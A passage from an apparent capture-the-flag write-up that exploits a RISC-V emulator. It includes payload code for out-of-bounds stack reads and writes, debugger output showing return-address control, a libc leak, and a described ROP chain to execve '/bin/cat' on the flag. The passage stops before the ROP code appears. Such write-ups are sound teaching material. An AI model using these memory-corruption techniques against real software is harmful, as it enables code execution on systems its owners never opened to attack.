</span></span><span style="display:flex;"><span>06:0030│  0x7fffffffd4b0 ◂— 0x2f7fbe7a0
</span></span><span style="display:flex;"><span>07:0038│  0x7fffffffd4b8 —▸ 0x555555555367 (main) ◂— push rbp
</span></span><span style="display:flex;"><span>08:0040│  0x7fffffffd4c0 —▸ 0x5555555586d0 (__libc_csu_init) ◂— push r15
</span></span><span style="display:flex;"><span>09:0048│  0x7fffffffd4c8 ◂— 0x2f49796781749cb6
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on that inspection, <code>mem</code> array is reside in stack, and <code>mem[0x100000+0x10]</code> is pointing to the stored RBP. Notice that <code>mem[0x100000+0x8]</code> is canary value, and <code>mem[0x100000+0x18]</code> is stored RIP. That means, if we try to overwrite it, we will get RIP Control. Let&rsquo;s modify our payload to overwrite the stored RIP address instead.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x41</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">8</span>) <span style="color:#09f;font-style:italic"># Shift left &lt;&lt; 8</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x41</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">8</span>) <span style="color:#09f;font-style:italic"># Shift left &lt;&lt; 8</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x41</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">8</span>) <span style="color:#09f;font-style:italic"># Shift left &lt;&lt; 8</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x41</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SD(reg(<span style="color:#c30">&#39;sp&#39;</span>), <span style="color:#f60">0x18</span>, reg(<span style="color:#c30">&#39;a0&#39;</span>))
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_LD(reg(<span style="color:#c30">&#39;sp&#39;</span>), <span style="color:#f60">0x58</span>, reg(<span style="color:#c30">&#39;a1&#39;</span>)) <span style="color:#09f;font-style:italic"># We only add this to set breakpoint in exec_LD, so that we can inspect the memory before the emulator exit</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And below is the gdb result</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0x80000020 -&gt; ld
</span></span><span style="display:flex;"><span>   zero: 00                s0: 00                a6: 00                 s8: 00
</span></span><span style="display:flex;"><span>     ra: 00                s1: 00                a7: 00                 s9: 00
</span></span><span style="display:flex;"><span>     sp: 0x80100000        a0: 0x41414141        s2: 00                s10: 00
</span></span><span style="display:flex;"><span>     gp: 00                a1: 0x7fffffffd580     s3: 00                s11: 00
</span></span><span style="display:flex;"><span>     tp: 00                a2: 00                s4: 00                 t3: 00
</span></span><span style="display:flex;"><span>     t0: 00                a3: 00                s5: 00                 t4: 00
</span></span><span style="display:flex;"><span>     t1: 00                a4: 00                s6: 00                 t5: 00
</span></span><span style="display:flex;"><span>     t2: 00                a5: 00                s7: 00                 t6: 00
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Program received signal SIGSEGV, Segmentation fault.
</span></span><span style="display:flex;"><span>0x0000000041414141 in ?? ()
</span></span><span style="display:flex;"><span>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>*RAX  0x0
</span></span><span style="display:flex;"><span> RBX  0x5555555586d0 (__libc_csu_init) ◂— push r15
</span></span><span style="display:flex;"><span> RCX  0x0
</span></span><span style="display:flex;"><span>*RDX  0x0
</span></span><span style="display:flex;"><span>*RDI  0x7ffff7fc47e0 (_IO_stdfile_1_lock) ◂— 0x0
</span></span><span style="display:flex;"><span>*RSI  0x55555555920d ◂— 0x45205d2d5b000000
</span></span><span style="display:flex;"><span> R8   0xffffffff
</span></span><span style="display:flex;"><span> R9   0x18
</span></span><span style="display:flex;"><span> R10  0x55555555920d ◂— 0x45205d2d5b000000
</span></span><span style="display:flex;"><span> R11  0x555555559048 ◂— 0x335b1b006d305b1b
</span></span><span style="display:flex;"><span> R12  0x555555555120 (_start) ◂— xor ebp, ebp
</span></span><span style="display:flex;"><span> R13  0x7fffffffd580 ◂— 0x2
</span></span><span style="display:flex;"><span> R14  0x0
</span></span><span style="display:flex;"><span> R15  0x0
</span></span><span style="display:flex;"><span>*RBP  0x0
</span></span><span style="display:flex;"><span>*RSP  0x7fffffffd4a0 ◂— 0x21 /* &#39;!&#39; */
</span></span><span style="display:flex;"><span>*RIP  0x41414141
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>Invalid address 0x41414141
</span></span></code></pre></td></tr></table>
</div>
</div><p>That confirms our hypothesis. We&rsquo;re now able to control RIP. Now it&rsquo;s time for us to leak some value. We can use the help of <code>exec_LD</code> to do this. But first, let&rsquo;s try to inspect for values around the stack.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pwndbg&gt; tele 0x7fffffffd480+0x58
</span></span><span style="display:flex;"><span>00:0000│  0x7fffffffd4d8 —▸ 0x7fffffffd580 ◂— 0x2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwndbg&gt; tele 0x7fffffffd480-0x2a8
</span></span><span style="display:flex;"><span>00:0000│  0x7fffffffd1d8 —▸ 0x7ffff7ddb2d0 ◂— 0xf0012000032a5
</span></span></code></pre></td></tr></table>
</div>
</div><p>We found a good address to get a stack address leak and libc address leak. To get the leak is very simple, we just need to:</p>
<ul>
<li>Set one register value to <code>0x80100000+0x58</code>, and then call <code>exec_LD</code> to get that address value. We will get stack address leak</li>
<li>Set one register value to <code>0x80100000-0x2a8</code>, and then call <code>exec_LD</code> to get that address value. We will get libc base</li>
</ul>
<p>Now that we can get some leak, I notice that the SUB function in the code is not working. But we can use <code>exec_ADDI</code> with negative 12-bit number to do subtraction. For example, look at this payload:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set t2 = 0x800ffd58. We will use this to leak libc base</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t2&#39;</span>), reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">0x80</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;t2&#39;</span>), reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t2&#39;</span>), reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">0x0f</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;t2&#39;</span>), reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t2&#39;</span>), reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">0xfd</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;t2&#39;</span>), reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;t2&#39;</span>), reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">0x58</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set a3 = mem[t2]</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_LD(reg(<span style="color:#c30">&#39;t2&#39;</span>), <span style="color:#f60">0x0</span>, reg(<span style="color:#c30">&#39;a3&#39;</span>)) <span style="color:#09f;font-style:italic"># a3 = mem[t2]. Observation via gdb, mem[t2] contains libc address. Now, a3 contains libc address</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> _ <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">82</span>):
</span></span><span style="display:flex;"><span>    payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a3&#39;</span>), reg(<span style="color:#c30">&#39;a3&#39;</span>), <span style="color:#f60">0xf00</span>) <span style="color:#09f;font-style:italic"># Subtract it by 0x100</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a3&#39;</span>), reg(<span style="color:#c30">&#39;a3&#39;</span>), <span style="color:#f60">0xf30</span>) <span style="color:#09f;font-style:italic"># subtract it by 0xd0. Now, a3 == libc_base</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>I try to set t2 to <code>0x800ffd58</code> (which is <code>0x80100000-0x2a8</code>), and then use <code>exec_LD</code> to get the leak and store it in <code>a3</code>. And then, with the help of <code>exec_ADDI</code>, I try to subtract it by <code>0x100</code> step by step until the <code>a3</code> value equals to libc base address.</p>
<p>Now that we know how to do OOB read and write, the exploitation is trivial. Notice that in <code>server.py</code> file, the <code>stdin</code> is redirected to <code>DEVNULL</code>, so we can&rsquo;t spawn a shell.</p>
<p>I choose to create a ROP payload to call <code>execve('/bin/cat', ['/bin.cat', 'flag'])</code>. With the OOB read, we know the stack and libc address, and with the OOB write, we can carefully build the <code>argv</code> array in the stack, and then pass the stack address during the call to <code>execve</code>. Below is the ROP payload to execute that.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
